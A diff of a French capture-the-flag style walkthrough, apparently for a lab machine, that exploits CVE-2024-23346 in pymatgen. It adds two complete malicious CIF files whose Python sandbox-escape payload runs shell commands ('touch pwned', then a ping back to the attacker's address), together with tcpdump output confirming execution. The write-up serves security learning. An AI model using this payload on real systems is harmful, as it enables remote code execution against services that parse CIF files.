@@ -573,7 +573,7 @@ pymatgen CVE
 
 Rapidement, une vulnérabilité critique ressort :
 
-> **CVE-2024-23346 – Pymatgen 2024.1 – Remote Code Execution (RCE)**
+**CVE-2024-23346 – Pymatgen 2024.1 – Remote Code Execution (RCE)**
 
 Cette CVE décrit une faille permettant l’exécution de code arbitraire via un fichier CIF spécialement conçu.
 
@@ -583,15 +583,99 @@ Cela correspond parfaitement au mécanisme *upload → view* observé sur la mac
 
 ### Analyse du Proof of Concept (PoC)
 
-L’étude du PoC montre que la vulnérabilité repose sur une injection dans une section spécifique du fichier CIF.
+En analysant le PoC, tu constates que [la vulnérabilité repose sur une injection dans une section spécifique du fichier CIF](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f).
 
-Le parser interprète certaines données de manière dangereuse, permettant l’exécution de code Python lors du parsing.
+Le parser évalue dynamiquement certaines données du fichier, permettant l’exécution de code lors du parsing.
 
 Le point clé est donc :
 
-> Le payload est exécuté au moment du parsing du fichier, c’est-à-dire lors du view.
+> Le payload est exécuté au moment du parsing du fichier, **c’est-à-dire lors du view.**
 
-Cela confirme que le vecteur n’est pas l’upload en lui-même, mais bien le traitement du fichier.
+Tu confirmes ainsi que le vecteur n’est pas l’upload en lui-même, mais bien le traitement du fichier.
+
+Le PoC présenté dans l’article repose sur l’injection d’une transformation malveillante dans un fichier `vuln.cif`, visant à exécuter une commande de test — en l’occurrence `touch pwned`, qui crée un fichier sur le système — afin de démontrer l’exécution de code lors du parsing.
+
+```bash
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "
+```
+
+Après l’upload et le *view* de `vuln.cif`, l’application retourne une **erreur 500 – Internal Server Error**.
+ Ce comportement est cohérent avec une exception déclenchée pendant l’analyse du fichier, ce qui suggère que le parser a bien atteint la zone vulnérable.
+
+Cependant, sans accès au système de fichiers, il est impossible de vérifier directement l’effet de la commande exécutée.
+
+ Il est donc préférable que tu utilises une commande produisant un effet réseau visible depuis ta machine, par exemple en générant du trafic sortant vers ton interface `tun0` avec un `ping -c 5 <ip tun0>`.
+
+Tu peux ensuite vérifier la réception de ce trafic côté Kali à l’aide de `sudo tcpdump -ni tun0 icmp`, ce qui te permettra de confirmer l’exécution de code de manière indirecte.
+
+Crée un fichier poc-ping.cif
+
+```bash
+nano poc-ping.cif
+```
+
+
+
+```bash
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 5 10.10.x.x");0,0,0'
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "
+```
+
+Dans un fenêtre Kali, lance la commande
+
+```bash
+sudo tcpdump -ni tun0 icmp
+```
+
+via l'interface web, uploade le fichier et lance le view
+
+ Tu constates que la commande ping est bien exécutée 5 fois avant d'afficher l'erreur 500
+
+```bash
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+10:41:31.937241 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 1, length 64
+10:41:31.937251 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 1, length 64
+10:41:32.904025 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 2, length 64
+10:41:32.904039 IP 10.10.x.x > 10.129x.x: ICMP echo reply, id 2, seq 2, length 64
+10:41:33.905702 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 3, length 64
+10:41:33.905717 IP 10.10.x.x> 10.129x.x: ICMP echo reply, id 2, seq 3, length 64
+10:41:34.908317 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 4, length 64
+10:41:34.908333 IP 10.10.x.x > 10.129x.x: ICMP echo reply, id 2, seq 4, length 64
+10:41:35.909620 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 5, length 64
+10:41:35.909635 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 5, length 64
+^C
+10 packets captured
+10 packets received by filter
+0 packets dropped by kernel
+```
+
+
 
 ------
 
